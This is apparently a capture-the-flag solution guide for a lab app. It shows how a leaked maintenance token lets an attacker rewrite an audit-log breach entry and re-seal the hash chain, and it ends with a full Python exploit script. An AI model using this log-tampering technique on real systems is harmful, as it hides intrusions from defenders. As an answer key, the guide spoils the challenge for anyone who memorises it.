# A09 Hard: Solution Guide

### Vulnerability Analysis
1. Attempting to access `/vault/classified` appends an `UNAUTHORIZED_BREACH_DETECTED` block into the audit ledger.
2. In `/static/js/titan_audit.js`, the developer left comments exposing the administrative maintenance endpoints and token:
   `// Master maintenance token: TITAN_SEC_MAINT_2026`
3. If an attacker edits the ledger event without recomputing the SHA-256 chain, the Sentinel fails validation due to a broken hash chain (`prev_hash` mismatch).
4. By invoking the maintenance API to tamper with the block and subsequently calling `/api/v1/audit/recompute-chain`, the audit evidence is completely erased and the hash chain is re-sealed.

### Exploitation Steps
1. Make an initial request to `/vault/classified` (this triggers the breach entry).
2. Retrieve the ledger from `GET /audit/ledger` and find the index of the `UNAUTHORIZED_BREACH_DETECTED` block.
3. Submit a POST request to `/api/v1/audit/tamper-block` with:
   - `index: <BREACH_INDEX>`
   - `event_type: ROUTINE_SECURITY_PATROL`
   - `details: Routine maintenance check`
   - `admin_key: TITAN_SEC_MAINT_2026`
4. Submit a POST request to `/api/v1/audit/recompute-chain` with:
   - `admin_key: TITAN_SEC_MAINT_2026`
5. Access `/vault/classified` within the same session and retrieve the dynamic flag.

### Exploit Script
```python
import re
import requests

BASE_URL = "http://127.0.0.1:6027"
s = requests.Session()

# 1. Trigger initial breach event
s.get(f"{BASE_URL}/vault/classified")

# 2. Inspect ledger to find breach block index
ledger_html = s.get(f"{BASE_URL}/audit/ledger").text
match = re.findall(r'#(\d+)</strong>.*?UNAUTHORIZED_BREACH_DETECTED', ledger_html, re.DOTALL)
breach_index = int(match[-1])
print(f"[+] Found breach event at block #{breach_index}")

# 3. Tamper with the breach block
tamper_resp = s.post(f"{BASE_URL}/api/v1/audit/tamper-block", data={
    "index": breach_index,
    "event_type": "ROUTINE_SECURITY_PATROL",
    "details": "Routine biometric calibration",
    "admin_key": "TITAN_SEC_MAINT_2026"
})

# 4. Recompute the hash chain
recompute_resp = s.post(f"{BASE_URL}/api/v1/audit/recompute-chain", data={
    "admin_key": "TITAN_SEC_MAINT_2026"
})

# 5. Access classified vault and claim flag
vault_resp = s.get(f"{BASE_URL}/vault/classified")
flag = re.search(r"RTSA\{[^}]+\}", vault_resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
